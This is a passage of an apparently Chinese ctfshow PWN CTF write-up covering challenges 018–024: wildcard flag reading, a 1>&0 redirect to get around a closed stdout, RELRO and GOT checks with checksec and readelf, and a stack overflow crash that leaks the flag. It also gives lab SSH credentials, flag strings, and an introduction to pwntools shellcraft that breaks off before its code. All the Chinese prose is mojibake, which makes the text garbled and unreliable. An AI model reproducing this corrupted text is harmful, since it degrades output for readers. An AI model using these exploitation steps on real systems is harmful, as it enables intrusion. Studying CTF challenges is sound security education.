		data-flex-grow="274"
		data-flex-basis="658px"
	
></p>
<p>è¿™ä¸ªcase2çš„readå‡½æ•°åªè¯»å–10å­—èŠ‚ä»¥å†…çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ctfshow_flagï¼ˆ12byteï¼‰è¿™ä¸²æ˜¯è¶…å­—èŠ‚é™åˆ¶äº†ã€‚ä¸è¿‡ä¹‹å‰å­¦äº†é‚£ä¸ªæŒ‡ä»¤æœ‰é€šé…ç¬¦çš„cat ctf*ï¼ˆå› ä¸ºå½“ä½ é€‰æ‹©â€ls ./â€œï¼Œæ‰“å¼€å…¨éƒ¨æ–‡ä»¶åï¼Œå‘ç°åªæœ‰ä¸€ä¸ªctfshow_flagæ—¶ç”±ctfå­—çœ¼çš„ï¼Œé‚£æˆ‘ä»¬æ­£å¥½å¯ä»¥ç»•è¿‡è¶…å­—èŠ‚çš„é™åˆ¶äº†ï¼‰</p>
<p>æœç´¢æ‰“å¼€ç”±ctfè¿™ä¸²å­—ç¬¦çš„æ–‡ä»¶å†…å®¹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/41.png"
	width="691"
	height="231"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/41_hu_fc1a2ff65540e4c9.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/41_hu_6ea90f86dc5d2b36.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="299"
		data-flex-basis="717px"
	
></p>
<h3 id="pwn_018">PWN_018
</h3><p>é¢˜ç›®ï¼šä»”ç»†çœ‹çœ‹æºç ï¼Œæˆ–è®¸æœ‰æƒŠå–œï¼›å‡ä½œçœŸæ—¶çœŸäº¦å‡ï¼ŒçœŸä½œå‡æ—¶å‡äº¦çœŸã€‚</p>
<p>è¿æ¥ncåä¸€ä¸Šæ¥å°±é—®ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/42.png"
	width="754"
	height="275"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/42_hu_b8edf74f377f50dc.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/42_hu_48a1d4051a0ee6e8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="274"
		data-flex-basis="658px"
	
></p>
<p>è¿™æˆ‘å“ªçŸ¥é“å•Šï¼Ÿå»çœ‹IDAx64ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/43.png"
	width="736"
	height="230"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/43_hu_a7c9b35aa1d7b9e4.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/43_hu_566fc56e89492c97.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="320"
		data-flex-basis="768px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/44.png"
	width="905"
	height="370"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/44_hu_c4fb8fcadd3dd78e.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/44_hu_1ce437554407a80a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="244"
		data-flex-basis="587px"
	
></p>
<p>åˆ†åˆ«è·Ÿè¿›ä¸€ä¸‹realå’Œfakeï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/46.png"
	width="689"
	height="156"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/46_hu_4f7764fbe823e672.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/46_hu_faedb59ceeafafd5.png 1024w"
	loading="lazy"
	
		alt="fake"
	
	
		class="gallery-image" 
		data-flex-grow="441"
		data-flex-basis="1060px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/47.png"
	width="711"
	height="189"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/47_hu_c473fd1e4140dc1a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/47_hu_f4c64f3e30a094f4.png 1024w"
	loading="lazy"
	
		alt="real"
	
	
		class="gallery-image" 
		data-flex-grow="376"
		data-flex-basis="902px"
	
></p>
<p>è§£è¯»ä¸€ä¸‹å‘ç°ä¸€ä¸ªæœºåˆ¶ï¼šå½“v4ä¸ç­‰äº9æ—¶å°±ä¼šæ‰§è¡Œrealå‡½æ•°ï¼Œè¿™æ—¶realä¼šæ‰§è¡Œ<code>echo 'flag is here'&gt;/ctfshow_flag</code>ï¼Œè¿™ä¸ªå‘½ä»¤å°†å­—ç¬¦ä¸² &lsquo;flag is here&rsquo; è¦†ç›–å†™å…¥ /ctfshow_flag æ–‡ä»¶ä¸­ã€‚ &gt; ç¬¦å·è¡¨ç¤ºä»¥è¦†ç›–çš„æ–¹å¼å†™å…¥æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚å¦‚æœ /ctfshow_flag æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆè¯¥å‘½ä»¤ä¼šå°†æ–‡ä»¶ä¸­åŸæœ‰çš„å†…å®¹æ›¿æ¢ä¸º &lsquo;flag is here&rsquo; ã€‚ä¹Ÿå°±æ˜¯è¯´ä½ ç¬¬ä¸€æ¬¡å’Œé¶æœºäº¤äº’æ—¶æ²¡è¾“å…¥9ï¼Œä½ ä»¥åéƒ½ä¸å¾—ä¸åˆ°flagäº†ï¼Œåªèƒ½é‡å¼€é¶æœº&hellip;..æ¯”è¾ƒCSå§&hellip;</p>
<p><code>echo 'flag is here'&gt;&gt;/ctfshow_flag</code>è¿™ä¸ªå‘½ä»¤å°†å­—ç¬¦ä¸² &lsquo;flag is here&rsquo; <em><strong>è¿½åŠ </strong></em>å†™å…¥ /ctfshow_flag æ–‡ä»¶ä¸­ã€‚ &raquo; ç¬¦å·è¡¨ç¤ºä»¥è¿½åŠ çš„æ–¹å¼å†™å…¥æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚å¦‚æœ /ctfshow_flag æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆè¯¥å‘½ä»¤ä¼šåœ¨æ–‡ä»¶çš„æœ«å°¾æ·»åŠ  &lsquo;flag is here&rsquo; ã€‚</p>
<p>è¿™ä¸¤ä¸ªå‘½ä»¤éƒ½ç”¨äºå°† &lsquo;flag is here&rsquo; å†™å…¥ /ctfshow_flag æ–‡ä»¶ä¸­ï¼Œä¸åŒä¹‹å¤„åœ¨äºå†™å…¥æ–¹å¼çš„ä¸åŒã€‚ç¬¬ä¸€ä¸ªå‘½ä»¤ä½¿ç”¨è¿½åŠ æ–¹å¼ï¼Œåœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ å†…å®¹ï¼›ç¬¬äºŒä¸ªå‘½ä»¤ä½¿ç”¨è¦†ç›–æ–¹å¼ï¼Œå°†æ–‡ä»¶å†…å®¹æ›¿æ¢ä¸ºæ–°å†…å®¹ã€‚å…·ä½“ä½¿ç”¨å“ªä¸ªå‘½ä»¤å–å†³äºéœ€æ±‚å’Œæ–‡ä»¶æ“ä½œçš„é¢„æœŸç»“æœã€‚ä¹Ÿå°±æ˜¯æ‰€å‡çš„å…¶å®æ˜¯æˆ‘ä»¬éœ€è¦çš„çœŸçš„ï¼ŒçœŸçš„åè€Œæ˜¯å‡çš„åœ¨è¿œç¨‹ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç¬¬ä¸€æ¬¡è¯»åˆ°flagï¼Œå¦åˆ™åç»­å¾—åˆ°çš„flagéƒ½å·²ç»è¢«è¦†å†™å†è¿½åŠ ï¼ŒçœŸå®çš„flagå†…å®¹å·²ç»æ²¡äº†ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/45.png"
	width="751"
	height="315"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/45_hu_5e1d20db51249b2d.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/45_hu_acaf9b3fd36a04e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="238"
		data-flex-basis="572px"
	
></p>
<h3 id="pwn_019">PWN_019
</h3><p>é¢˜ç›®ï¼šå…³é—­äº†è¾“å‡ºæµï¼Œä¸€å®šæ˜¯æœ€å®‰å…¨çš„å—ï¼Ÿ</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/48.png"
	width="1315"
	height="636"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/48_hu_2e667aaa82bc0e4f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/48_hu_d60e1adae16a1f50.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="206"
		data-flex-basis="496px"
	
></p>
<p>åœ¨IDAä¸Šçœ‹åˆ°ï¼Œæ˜¯ç”±readå’Œsystemå‡½æ•°çš„ï¼ŒæŒ‰é“ç†æˆ‘ç›´æ¥cat /ctf*åº”è¯¥å°±å‡ºflagäº†å•Š&hellip;</p>
<p>é—®é¢˜å°±å‡ºåœ¨è¿™ä¸ªfcloseå‡½æ•°ï¼ˆç¡®å®æ²¡è¾™äº†ï¼Œåªèƒ½ç”¨AIè§£é‡Šä¸€ä¸‹äº†ï¼‰ä½œç”¨æ˜¯å…³é—­æ–‡ä»¶è¾“å‡ºæµï¼Œæ ‡å‡†è¾“å‡ºè¢«å…³é—­äº†ï¼ˆæ— æ³•æ˜¾ç¤ºï¼‰ã€‚</p>
<p>é‚£è¿˜æœ‰<strong>è¾“å…¥æµ</strong>å•Šï¼Œå¯ä»¥ç”¨é‡å®šå‘ï¼š<strong><code>1&gt;&amp;0</code></strong></p>
<p>è¿™æ˜¯ Linux çš„ I/O é‡å®šå‘è¯­æ³•ï¼š</p>
<ul>
<li><code>1</code> ä»£è¡¨<strong>æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰</strong>ï¼ˆæ­£å¸¸æƒ…å†µä¸‹ï¼Œå‘½ä»¤çš„è¾“å‡ºä¼šé€åˆ°è¿™é‡Œï¼Œæ˜¾ç¤ºåœ¨ç»ˆç«¯ï¼‰ï¼›</li>
<li><code>0</code> ä»£è¡¨<strong>æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰</strong>ï¼ˆæ­£å¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·è¾“å…¥ä»è¿™é‡Œè¯»å–ï¼Œé€šå¸¸æŒ‡å‘ç»ˆç«¯ï¼‰ï¼›</li>
<li><code>1&gt;&amp;0</code> è¡¨ç¤ºï¼š<strong>å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥æ‰€æŒ‡å‘çš„ä½ç½®</strong>ã€‚</li>
</ul>
<p>å› ä¸ºä»£ç ä¸­æ ‡å‡†è¾“å‡ºè¢«å…³é—­äº†ï¼ˆæ— æ³•æ˜¾ç¤ºï¼‰ï¼Œä½†æ ‡å‡†è¾“å…¥ï¼ˆé€šå¸¸æ˜¯ç»ˆç«¯ï¼‰ä»ç„¶å¯ç”¨ï¼Œæ‰€ä»¥é€šè¿‡è¿™ä¸ªé‡å®šå‘ï¼Œ<code>cat</code> å‘½ä»¤çš„è¾“å‡ºä¼šè¢« â€œè½¬ç§»â€ åˆ°æ ‡å‡†è¾“å…¥å¯¹åº”çš„ç»ˆç«¯ï¼Œä»è€Œè®©å†…å®¹èƒ½æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<p>ç®€å•è¯´å°±æ˜¯ï¼šæ­£å¸¸æ˜¾ç¤ºå†…å®¹çš„ â€œè¾“å‡ºé€šé“â€ è¢«å…³äº†ï¼Œä½†æ¥æ”¶è¾“å…¥çš„ â€œè¾“å…¥é€šé“â€ è¿˜èƒ½ç”¨ã€‚é€šè¿‡ 1&gt;&amp;0 æŠŠåŸæœ¬è¯¥ä» â€œè¾“å‡ºé€šé“â€ æ˜¾ç¤ºçš„å†…å®¹ï¼Œè½¬åˆ° â€œè¾“å…¥é€šé“â€ å¯¹åº”çš„ç»ˆç«¯ä¸Šï¼Œè¿™æ ·å°±èƒ½çœ‹åˆ° flag äº†ã€‚ctfshow{a390a91b-5203-46ae-812d-0396de95184f}</p>
<p>æœ¬è´¨ä¸Šæ˜¯åˆ©ç”¨äº† â€œè¾“å…¥é€šé“å’Œç»ˆç«¯è¿˜è¿ç€â€ è¿™ä¸ªæ¼æ´ï¼Œè®©å†…å®¹ â€œå€Ÿé“â€ æ˜¾ç¤ºå‡ºæ¥ï½ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/49.png"
	width="1030"
	height="550"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/49_hu_9e7f3c9c7cb0a617.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/49_hu_2a293b314017f370.png 1024w"
	loading="lazy"
	
		alt="é‡å®šå‘"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="449px"
	
></p>
<h3 id="pwn_020">PWN_020
</h3><p>é¢˜ç›®ï¼šæäº¤ctfshow{ã€.gotè¡¨ä¸.got.pltæ˜¯å¦å¯å†™(å¯å†™ä¸º1ï¼Œä¸å¯å†™ä¸º0)ã€‘,ã€.gotçš„åœ°å€ã€‘,ã€.got.pltçš„åœ°å€ã€‘}</p>
<p>ä¾‹å¦‚ .gotå¯å†™.got.pltè¡¨å¯å†™å…¶åœ°å€ä¸º0x400820 0x8208820</p>
<p>æœ€ç»ˆflagä¸ºctfshow{1_1_0x400820_0x8208820}</p>
<p>è‹¥æŸä¸ªè¡¨ä¸å­˜åœ¨ï¼Œåˆ™æ— éœ€å†™å…¶å¯¹åº”åœ°å€</p>
<p>å¦‚ä¸å­˜åœ¨.got.pltè¡¨ï¼Œåˆ™æœ€ç»ˆflagå€¼ä¸ºctfshow{1_0_0x400820}</p>
<hr>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/50.png"
	width="600"
	height="155"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/50_hu_5395d84a6ce1faca.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/50_hu_d78e65288b53f8ce.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="387"
		data-flex-basis="929px"
	
></p>
<p>åœ¨è¿™é‡Œåªå¼€äº†NXä¿æŠ¤ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/51.png"
	width="755"
	height="264"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/51_hu_ec1407a9bbbb57d8.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/51_hu_5eec920743e7e000.png 1024w"
	loading="lazy"
	
		alt="Hintæç¤ºï¼šä»€ä¹ˆæ˜¯RETROä¿æŠ¤"
	
	
		class="gallery-image" 
		data-flex-grow="285"
		data-flex-basis="686px"
	
></p>
<p>åœ¨<a class="link" href="https://expl0rer.top/p/pwn-1/#relro"  target="_blank" rel="noopener"
    >PWN-1çš„Linuxå®‰å…¨é˜²æŠ¤æœºåˆ¶</a>è¿™ä¸€ç« çš„å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬æœ‰è®¤è¯†åˆ°RELROè¿™ä¸ªä¿æŠ¤ã€‚å¾ˆæ˜¾ç„¶no RELROæ„å‘³ç€.gotå’Œ.got.pltè¡¨éƒ½å¯å†™ã€‚</p>
<p>ç”¨æŒ‡ä»¤æŸ¥è¡¨åœ°å€ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">readelf -S PWN_020
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/52.png"
	width="1044"
	height="630"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/52_hu_9e02d9e9ca78633b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/52_hu_cfc6139e4ad6cdf.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="165"
		data-flex-basis="397px"
	
></p>
<p>è€å¿ƒæ‰¾ä¸€ä¸‹å°±æ‰¾åˆ°äº†ï¼Œæ•…flag:ctfshow{1_1_0x600f18_0x600f28}</p>
<h3 id="pwn_021">PWN_021
</h3><p>é¢˜ç›®ï¼šæäº¤ctfshow{ã€.gotè¡¨ä¸.got.pltæ˜¯å¦å¯å†™(å¯å†™ä¸º1ï¼Œä¸å¯å†™ä¸º0)ã€‘,ã€.gotçš„åœ°å€ã€‘,ã€.got.pltçš„åœ°å€ã€‘}</p>
<p>ä¾‹å¦‚ .gotå¯å†™.got.pltè¡¨å¯å†™å…¶åœ°å€ä¸º0x400820 0x8208820</p>
<p>æœ€ç»ˆflagä¸ºctfshow{1_1_0x400820_0x8208820}</p>
<p>è‹¥æŸä¸ªè¡¨ä¸å­˜åœ¨ï¼Œåˆ™æ— éœ€å†™å…¶å¯¹åº”åœ°å€</p>
<p>å¦‚ä¸å­˜åœ¨.got.pltè¡¨ï¼Œåˆ™æœ€ç»ˆflagå€¼ä¸ºctfshow{1_0_0x400820}</p>
<hr>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/53.png"
	width="1215"
	height="610"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/53_hu_8be2513129fe3dd3.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/53_hu_b1f2d1e70b5f95ba.png 1024w"
	loading="lazy"
	
		alt="partial Relroä¿æŠ¤"
	
	
		class="gallery-image" 
		data-flex-grow="199"
		data-flex-basis="478px"
	
></p>
<p>è¦è¿˜ä¸è®°å¾—Relroä¿æŠ¤æœºåˆ¶åŸç†çš„å°±å›PWN-1å»çœ‹å§&hellip;</p>
<p>è¿™é‡Œæ˜¯ GOT è¡¨çš„å‰åŠéƒ¨åˆ†ï¼ˆ.got.pltï¼‰è®¾ç½®ä¸ºåªè¯»ï¼ŒååŠéƒ¨åˆ†ï¼ˆ.gotï¼‰ä»å¯å†™ã€‚</p>
<p>ç”¨readelfå‘½ä»¤å»çˆ±çœ‹è¡¨åœ°å€å°±å¥½äº†ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/54.png"
	width="670"
	height="114"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/54_hu_8d769b287fb3ac64.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/54_hu_3cbf63d5305f0ffc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="587"
		data-flex-basis="1410px"
	
></p>
<p>flag:ctfshow{0_1_0x600ff0_0x601000}</p>
<h3 id="pwn_021-1">PWN_021
</h3><p>é¢˜ç›®ï¼šæäº¤ctfshow{ã€.gotè¡¨ä¸.got.pltæ˜¯å¦å¯å†™(å¯å†™ä¸º1ï¼Œä¸å¯å†™ä¸º0)ã€‘,ã€.gotçš„åœ°å€ã€‘,ã€.got.pltçš„åœ°å€ã€‘}</p>
<p>ä¾‹å¦‚ .gotå¯å†™.got.pltè¡¨å¯å†™å…¶åœ°å€ä¸º0x400820 0x8208820</p>
<p>æœ€ç»ˆflagä¸ºctfshow{1_1_0x400820_0x8208820}</p>
<p>è‹¥æŸä¸ªè¡¨ä¸å­˜åœ¨ï¼Œåˆ™æ— éœ€å†™å…¶å¯¹åº”åœ°å€</p>
<p>å¦‚ä¸å­˜åœ¨.got.pltè¡¨ï¼Œåˆ™æœ€ç»ˆflagå€¼ä¸ºctfshow{1_0_0x400820}</p>
<hr>
<p>é“ç†ä¸€æ ·checksecçœ‹relroçš„ä¿æŠ¤ã€readelfçœ‹è¡¨&hellip;..</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/55.png"
	width="725"
	height="153"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/55_hu_4f21e41ae9717f96.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/55_hu_9ef604a41c7706ab.png 1024w"
	loading="lazy"
	
		alt=".gotã€.got.pltè¡¨éƒ½ä¸å¯å†™"
	
	
		class="gallery-image" 
		data-flex-grow="473"
		data-flex-basis="1137px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/56.png"
	width="705"
	height="101"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/56_hu_fd84664444ae0205.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/56_hu_beb3fc8924561d37.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="698"
		data-flex-basis="1675px"
	
></p>
<p>è¿™æ¬¡å°±åªæœ‰ä¸€ä¸ª.gotè¡¨äº†ï¼Œé‚£å°±æ˜¯flagï¼šctfshow{0_0_0x600fc0}</p>
<h3 id="pwn_023">PWN_023
</h3><p>é¢˜ç›®ï¼šç”¨æˆ·åä¸º ctfshow å¯†ç  ä¸º 123456 è¯·ä½¿ç”¨ sshè½¯ä»¶è¿æ¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh ctfshow@é¢˜ç›®åœ°å€ -pé¢˜ç›®ç«¯å£å·
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>ä¸æ˜¯ncè¿æ¥</strong></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/57.png"
	width="695"
	height="140"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/57_hu_55b6f42bf446c46b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/57_hu_a8dd5de87eab3f4f.png 1024w"
	loading="lazy"
	
		alt="checksecä¸€ä¸‹"
	
	
		class="gallery-image" 
		data-flex-grow="496"
		data-flex-basis="1191px"
	
></p>
<p>æ²¡æœ‰canaryä¿æŠ¤ï¼Œè¿™å¯ä»¥æ˜¯ä¸ªçªç ´ç‚¹ï¼šæ ˆæº¢å‡ºæ¼æ´ã€‚</p>
<p>çœ‹å›IDAï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/58.png"
	width="1060"
	height="615"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/58_hu_803795aedfc75284.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/58_hu_31f0d9d5938f057f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="172"
		data-flex-basis="413px"
	
></p>
<p>è·Ÿè¿›ctfshowå‡½æ•°</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/59.png"
	width="669"
	height="159"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/59_hu_14eb223bc3e77877.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/59_hu_99cf8a4061518c1e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="420"
		data-flex-basis="1009px"
	
></p>
<p>å¯ä»¥çŸ¥é“ï¼Œä¸€å¼€å§‹dgetså‡½æ•°è¯»å–flagå­—ç¬¦ä¸²åˆ°å†…å­˜ä¸­</p>
<p>è·Ÿè¿›signalå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/60.png"
	width="529"
	height="139"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/60_hu_e4f58d85598c5ca3.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/60_hu_e7413abc36f52d2b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="380"
		data-flex-basis="913px"
	
></p>
<p>è¿™è¡Œä»£ç ä¼šå°†å†…å­˜ä¸­å­˜å‚¨çš„ <code>flag</code> å­—ç¬¦ä¸²ï¼Œè¾“å‡ºåˆ°æ ‡å‡†é”™è¯¯æµï¼ˆ<code>stderr</code>ï¼‰ã€‚å› ä¸ºç¨‹åºå¯åŠ¨æ—¶å·²ç»é€šè¿‡ <code>fgets</code> ä» <code>/ctfshow_flag</code> æ–‡ä»¶è¯»å–äº† flag å†…å®¹åˆ° <code>flag</code> å˜é‡ä¸­ï¼Œæ‰€ä»¥è¿™é‡Œèƒ½ç›´æ¥æ‰“å°å‡ºæ­£ç¡®çš„ flagã€‚</p>
<p>æ‰€ä»¥è¯´æˆ‘ä»¬è®©ç¨‹åºæŠ¥é”™ä¹Ÿå°±æ˜¯è®©å®ƒæ ˆæº¢å‡ºï¼Œè¦†ç›–åçš„åœ°å€è¿˜ä¸èƒ½æ˜¯æœ‰æ•ˆåœ°å€ï¼Œè®©å®ƒå…¨éƒ¨æŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥è¾“å…¥å¥½å¤šä¸ªaå°±è¡Œï¼Œå‡ åä¸ªaçš„16è¿›åˆ¶åœ°å€æ˜¯æ— æ•ˆåœ°å€ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/61.png"
	width="945"
	height="394"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/61_hu_dbfd74188df09469.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/61_hu_a8d8dd6c093b2cde.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="239"
		data-flex-basis="575px"
	
></p>
<p>å…³äºæ ˆæº¢å‡ºè¿™éƒ¨åˆ†ï¼Œè¯·çœ‹<a class="link" href="https://expl0rer.top/p/pwn-2/"  target="_blank" rel="noopener"
    >PWN-2</a>è¯¦ç»†å­¦ä¹ ï¼ŒPWNæ¿å—å æ¯”ä¹Ÿæ˜¯é‡è¦çš„ã€‚</p>
<p>é€æ¸å¼€å§‹ä¸Šå¼ºåº¦äº†ï¼Œè¿™æ—¶éœ€è¦ä»”ç»†çœ‹IDAçš„ä»£ç åˆ†æäº†ï¼Œçœ‹çœ‹æ˜¯ä»€ä¹ˆå·¥ä½œåŸç†ã€‚</p>
<p>flagï¼šctfshow{0f207f1f-71bb-4cdd-bdab-7bfb9acde27a}</p>
<h3 id="pwn_024">PWN_024
</h3><h4 id="é¢˜ç›®">é¢˜ç›®ï¼š
</h4><p>ä½ å¯ä»¥ä½¿ç”¨<code>pwntools</code>çš„<code>shellcraft</code>æ¨¡å—æ¥è¿›è¡Œæ”»å‡»</p>
<p>æˆ‘æ¥ä»‹ç»ä¸€ä¸‹shellcraftæ¨¡å—ï¼šå®ƒæ˜¯ pwntools åº“ä¸­çš„ä¸€ä¸ªå­æ¨¡å—ï¼Œç”¨äºç”Ÿæˆå„ç§ä¸åŒä½“ç³»ç»“æ„çš„ Shellcodeï¼ˆè¿™é‡Œçš„ä¸åŒä½“ç³»æ˜¯æˆ‘ä»¬ä¹‹å‰å­¦è¿‡çš„<a class="link" href="https://expl0rer.top/p/%e7%bd%91%e5%ae%89%e5%ad%a6%e4%b9%a0%e7%ac%ac%e4%b8%80%e9%98%b6%e6%ae%b5/#%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e5%9f%ba%e7%a1%80"  target="_blank" rel="noopener"
    >æ“ä½œç³»ç»ŸåŸºç¡€çš„æœ‰å…³shellçš„é‚£ä¸€ç« èŠ‚</a>ï¼‰æœ‰zshã€bashç­‰ã€‚Shellcode æ˜¯ä¸€æ®µä»¥äºŒè¿›åˆ¶å½¢å¼ç¼–å†™çš„ä»£ç ï¼Œç”¨äºåˆ©ç”¨è½¯ä»¶æ¼æ´ã€æ‰§è¡Œç‰¹å®šæ“ä½œæˆ–è·å–ç³»ç»Ÿæƒé™ã€‚shellcraft æ¨¡å—æä¾›äº†ä¸€ç³»åˆ—å‡½æ•°å’Œæ–¹æ³•ï¼Œç”¨äºç”Ÿæˆç‰¹å®šä½“ç³»ç»“æ„ä¸‹çš„Shellcodeã€‚</p>
<p>ç”Ÿæˆçš„æ±‡ç¼–ä»£ç å¯ç›´æ¥é€šè¿‡ asm() å‡½æ•°è½¬æ¢ä¸ºæœºå™¨ç ï¼ˆäºŒè¿›åˆ¶ï¼‰ï¼Œæ— éœ€æ‰‹åŠ¨å¤„ç†æ ¼å¼ï¼Œä¾‹å¦‚ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
